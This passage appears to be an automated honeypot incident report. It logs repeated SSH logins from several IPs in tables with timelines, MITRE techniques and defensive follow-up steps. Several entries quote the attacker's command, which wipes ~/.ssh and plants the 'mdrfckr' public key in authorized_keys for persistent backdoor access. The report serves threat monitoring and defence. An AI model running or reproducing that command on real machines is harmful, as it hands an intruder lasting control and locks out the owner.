| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:00:47` | `cowrie.session.connect` |
| `2026-06-02 05:00:47` | `cowrie.client.version` |
| `2026-06-02 05:00:47` | `cowrie.client.kex` |
| `2026-06-02 05:00:48` | `cowrie.login.success` |
| `2026-06-02 05:00:48` | `cowrie.session.params` |
| `2026-06-02 05:00:48` | `cowrie.command.input` |
| `2026-06-02 05:00:48` | `cowrie.command.failed` |
| `2026-06-02 05:00:49` | `cowrie.log.closed` |
| `2026-06-02 05:00:49` | `cowrie.session.params` |
| `2026-06-02 05:00:49` | `cowrie.command.input` |
| `2026-06-02 05:00:49` | `cowrie.session.file_download` |
| `2026-06-02 05:00:49` | `cowrie.log.closed` |
| `2026-06-02 05:00:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c63bdd3fc3a4

| Field | Detail |
|---|---|
| **Source IP** | `131.196.14[.]35` |
| **First Seen** | 2026-06-02 05:00 |
| **Last Seen** | 2026-06-02 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:00:49` | `cowrie.session.connect` |
| `2026-06-02 05:00:49` | `cowrie.client.version` |
| `2026-06-02 05:00:49` | `cowrie.client.kex` |
| `2026-06-02 05:00:50` | `cowrie.login.success` |
| `2026-06-02 05:00:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.196.14[.]35` to AbuseIPDB if not already reported
- [ ] Block `131.196.14[.]35` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f46fb5fbd4b

| Field | Detail |
|---|---|
| **Source IP** | `211.228.218[.]47` |
| **First Seen** | 2026-06-02 05:00 |
| **Last Seen** | 2026-06-02 05:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:00:51` | `cowrie.session.connect` |
| `2026-06-02 05:00:51` | `cowrie.client.version` |
| `2026-06-02 05:00:51` | `cowrie.client.kex` |
| `2026-06-02 05:00:52` | `cowrie.login.success` |
| `2026-06-02 05:00:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.228.218[.]47` to AbuseIPDB if not already reported
- [ ] Block `211.228.218[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-329233f2851a

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-06-02 05:02 |
| **Last Seen** | 2026-06-02 05:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:02:33` | `cowrie.session.connect` |
| `2026-06-02 05:02:33` | `cowrie.client.version` |
| `2026-06-02 05:02:33` | `cowrie.client.kex` |
| `2026-06-02 05:02:34` | `cowrie.login.success` |
| `2026-06-02 05:02:34` | `cowrie.session.params` |
| `2026-06-02 05:02:34` | `cowrie.command.input` |
| `2026-06-02 05:02:34` | `cowrie.command.failed` |
| `2026-06-02 05:02:34` | `cowrie.log.closed` |
| `2026-06-02 05:02:35` | `cowrie.session.params` |
| `2026-06-02 05:02:35` | `cowrie.command.input` |
| `2026-06-02 05:02:35` | `cowrie.session.file_download` |
| `2026-06-02 05:02:35` | `cowrie.log.closed` |
| `2026-06-02 05:02:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38ba29640b4b

| Field | Detail |
|---|---|
| **Source IP** | `103.237.144[.]204` |
| **First Seen** | 2026-06-02 05:02 |
| **Last Seen** | 2026-06-02 05:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:02:37` | `cowrie.session.connect` |
| `2026-06-02 05:02:37` | `cowrie.client.version` |
| `2026-06-02 05:02:37` | `cowrie.client.kex` |
| `2026-06-02 05:02:38` | `cowrie.login.success` |
| `2026-06-02 05:02:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.237.144[.]204` to AbuseIPDB if not already reported
- [ ] Block `103.237.144[.]204` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f3dbec43fb2

| Field | Detail |
|---|---|
| **Source IP** | `180.178.94[.]214` |
| **First Seen** | 2026-06-02 05:02 |
| **Last Seen** | 2026-06-02 05:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:02:45` | `cowrie.session.connect` |
| `2026-06-02 05:02:45` | `cowrie.client.version` |
| `2026-06-02 05:02:45` | `cowrie.client.kex` |
| `2026-06-02 05:02:46` | `cowrie.login.success` |
| `2026-06-02 05:02:46` | `cowrie.session.params` |
| `2026-06-02 05:02:46` | `cowrie.command.input` |
| `2026-06-02 05:02:46` | `cowrie.command.failed` |
| `2026-06-02 05:02:47` | `cowrie.log.closed` |
| `2026-06-02 05:02:47` | `cowrie.session.params` |
| `2026-06-02 05:02:47` | `cowrie.command.input` |
| `2026-06-02 05:02:47` | `cowrie.session.file_download` |
| `2026-06-02 05:02:47` | `cowrie.log.closed` |
| `2026-06-02 05:02:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.178.94[.]214` to AbuseIPDB if not already reported
- [ ] Block `180.178.94[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52ddeb5578be

| Field | Detail |
|---|---|
| **Source IP** | `103.190.214[.]241` |
| **First Seen** | 2026-06-02 05:02 |
| **Last Seen** | 2026-06-02 05:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:02:45` | `cowrie.session.connect` |
| `2026-06-02 05:02:45` | `cowrie.client.version` |
| `2026-06-02 05:02:45` | `cowrie.client.kex` |
| `2026-06-02 05:02:46` | `cowrie.login.success` |
| `2026-06-02 05:02:46` | `cowrie.session.params` |
| `2026-06-02 05:02:46` | `cowrie.command.input` |
| `2026-06-02 05:02:46` | `cowrie.command.failed` |
| `2026-06-02 05:02:46` | `cowrie.log.closed` |
| `2026-06-02 05:02:46` | `cowrie.session.params` |
| `2026-06-02 05:02:46` | `cowrie.command.input` |
| `2026-06-02 05:02:46` | `cowrie.session.file_download` |
| `2026-06-02 05:02:46` | `cowrie.log.closed` |
| `2026-06-02 05:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.214[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.190.214[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff60af582cd2

| Field | Detail |
|---|---|
| **Source IP** | `103.190.214[.]241` |
| **First Seen** | 2026-06-02 05:02 |
| **Last Seen** | 2026-06-02 05:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:02:48` | `cowrie.session.connect` |
| `2026-06-02 05:02:48` | `cowrie.client.version` |
| `2026-06-02 05:02:48` | `cowrie.client.kex` |
| `2026-06-02 05:02:48` | `cowrie.login.success` |
| `2026-06-02 05:02:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.214[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.190.214[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9701d04e967

| Field | Detail |
|---|---|
| **Source IP** | `180.178.94[.]214` |
| **First Seen** | 2026-06-02 05:02 |
| **Last Seen** | 2026-06-02 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:02:49` | `cowrie.session.connect` |
| `2026-06-02 05:02:49` | `cowrie.client.version` |
| `2026-06-02 05:02:50` | `cowrie.client.kex` |
| `2026-06-02 05:02:50` | `cowrie.login.success` |
| `2026-06-02 05:02:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.178.94[.]214` to AbuseIPDB if not already reported
- [ ] Block `180.178.94[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54d70d1c45b4

| Field | Detail |
|---|---|
| **Source IP** | `180.178.94[.]214` |
| **First Seen** | 2026-06-02 05:04 |
| **Last Seen** | 2026-06-02 05:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:04:34` | `cowrie.session.connect` |
| `2026-06-02 05:04:34` | `cowrie.client.version` |
| `2026-06-02 05:04:35` | `cowrie.client.kex` |
| `2026-06-02 05:04:35` | `cowrie.login.success` |
| `2026-06-02 05:04:36` | `cowrie.session.params` |
| `2026-06-02 05:04:36` | `cowrie.command.input` |
| `2026-06-02 05:04:36` | `cowrie.command.failed` |
| `2026-06-02 05:04:36` | `cowrie.log.closed` |
| `2026-06-02 05:04:36` | `cowrie.session.params` |
| `2026-06-02 05:04:36` | `cowrie.command.input` |
| `2026-06-02 05:04:37` | `cowrie.session.file_download` |
| `2026-06-02 05:04:37` | `cowrie.log.closed` |
| `2026-06-02 05:04:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.178.94[.]214` to AbuseIPDB if not already reported
- [ ] Block `180.178.94[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a7b32e33512

| Field | Detail |
|---|---|
| **Source IP** | `180.178.94[.]214` |
| **First Seen** | 2026-06-02 05:04 |
| **Last Seen** | 2026-06-02 05:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:04:39` | `cowrie.session.connect` |
| `2026-06-02 05:04:39` | `cowrie.client.version` |
| `2026-06-02 05:04:39` | `cowrie.client.kex` |
| `2026-06-02 05:04:40` | `cowrie.login.success` |
| `2026-06-02 05:04:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.178.94[.]214` to AbuseIPDB if not already reported
- [ ] Block `180.178.94[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a252ab268084

| Field | Detail |
|---|---|
| **Source IP** | `103.190.214[.]241` |
| **First Seen** | 2026-06-02 05:06 |
| **Last Seen** | 2026-06-02 05:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:06:20` | `cowrie.session.connect` |
| `2026-06-02 05:06:20` | `cowrie.client.version` |
| `2026-06-02 05:06:20` | `cowrie.client.kex` |
| `2026-06-02 05:06:21` | `cowrie.login.success` |
| `2026-06-02 05:06:21` | `cowrie.session.params` |
| `2026-06-02 05:06:21` | `cowrie.command.input` |
| `2026-06-02 05:06:21` | `cowrie.command.failed` |
| `2026-06-02 05:06:21` | `cowrie.log.closed` |
| `2026-06-02 05:06:21` | `cowrie.session.params` |
| `2026-06-02 05:06:21` | `cowrie.command.input` |
| `2026-06-02 05:06:21` | `cowrie.session.file_download` |
| `2026-06-02 05:06:21` | `cowrie.log.closed` |
| `2026-06-02 05:06:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.214[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.190.214[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f50874a0b42

| Field | Detail |
|---|---|
| **Source IP** | `103.190.214[.]241` |
| **First Seen** | 2026-06-02 05:06 |
| **Last Seen** | 2026-06-02 05:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:06:23` | `cowrie.session.connect` |
| `2026-06-02 05:06:23` | `cowrie.client.version` |
| `2026-06-02 05:06:23` | `cowrie.client.kex` |
| `2026-06-02 05:06:23` | `cowrie.login.success` |
| `2026-06-02 05:06:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.214[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.190.214[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3739a29232e2

| Field | Detail |
|---|---|
| **Source IP** | `103.190.214[.]241` |
| **First Seen** | 2026-06-02 05:09 |
| **Last Seen** | 2026-06-02 05:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:09:52` | `cowrie.session.connect` |
| `2026-06-02 05:09:52` | `cowrie.client.version` |
| `2026-06-02 05:09:52` | `cowrie.client.kex` |
| `2026-06-02 05:09:53` | `cowrie.login.success` |
| `2026-06-02 05:09:53` | `cowrie.session.params` |
| `2026-06-02 05:09:53` | `cowrie.command.input` |
| `2026-06-02 05:09:53` | `cowrie.command.failed` |
| `2026-06-02 05:09:53` | `cowrie.log.closed` |
| `2026-06-02 05:09:53` | `cowrie.session.params` |
| `2026-06-02 05:09:53` | `cowrie.command.input` |
| `2026-06-02 05:09:53` | `cowrie.session.file_download` |
| `2026-06-02 05:09:53` | `cowrie.log.closed` |
| `2026-06-02 05:09:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.214[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.190.214[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b32fda038963

| Field | Detail |
|---|---|
| **Source IP** | `103.190.214[.]241` |
| **First Seen** | 2026-06-02 05:09 |
| **Last Seen** | 2026-06-02 05:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:09:55` | `cowrie.session.connect` |
| `2026-06-02 05:09:55` | `cowrie.client.version` |
| `2026-06-02 05:09:55` | `cowrie.client.kex` |
| `2026-06-02 05:09:55` | `cowrie.login.success` |
| `2026-06-02 05:09:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.190.214[.]241` to AbuseIPDB if not already reported
- [ ] Block `103.190.214[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bf9ad945c57

| Field | Detail |
|---|---|
| **Source IP** | `202.184.134[.]88` |
| **First Seen** | 2026-06-02 05:44 |
| **Last Seen** | 2026-06-02 05:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:44:20` | `cowrie.session.connect` |
| `2026-06-02 05:44:20` | `cowrie.client.version` |
| `2026-06-02 05:44:20` | `cowrie.client.kex` |
| `2026-06-02 05:44:20` | `cowrie.login.success` |
| `2026-06-02 05:44:20` | `cowrie.session.params` |
| `2026-06-02 05:44:20` | `cowrie.command.input` |
| `2026-06-02 05:44:20` | `cowrie.command.failed` |
| `2026-06-02 05:44:21` | `cowrie.log.closed` |
| `2026-06-02 05:44:21` | `cowrie.session.params` |
| `2026-06-02 05:44:21` | `cowrie.command.input` |
| `2026-06-02 05:44:21` | `cowrie.session.file_download` |
| `2026-06-02 05:44:21` | `cowrie.log.closed` |
| `2026-06-02 05:44:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.184.134[.]88` to AbuseIPDB if not already reported
- [ ] Block `202.184.134[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b22b0465ef74

| Field | Detail |
|---|---|
| **Source IP** | `202.184.134[.]88` |
| **First Seen** | 2026-06-02 05:44 |
| **Last Seen** | 2026-06-02 05:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 05:44:22` | `cowrie.session.connect` |
| `2026-06-02 05:44:22` | `cowrie.client.version` |
| `2026-06-02 05:44:22` | `cowrie.client.kex` |
| `2026-06-02 05:44:23` | `cowrie.login.success` |
| `2026-06-02 05:44:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.184.134[.]88` to AbuseIPDB if not already reported
- [ ] Block `202.184.134[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b6755820b58

| Field | Detail |
|---|---|
| **Source IP** | `182.191.77[.]164` |
| **First Seen** | 2026-06-02 05:45 |
| **Last Seen** | 2026-06-02 05:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
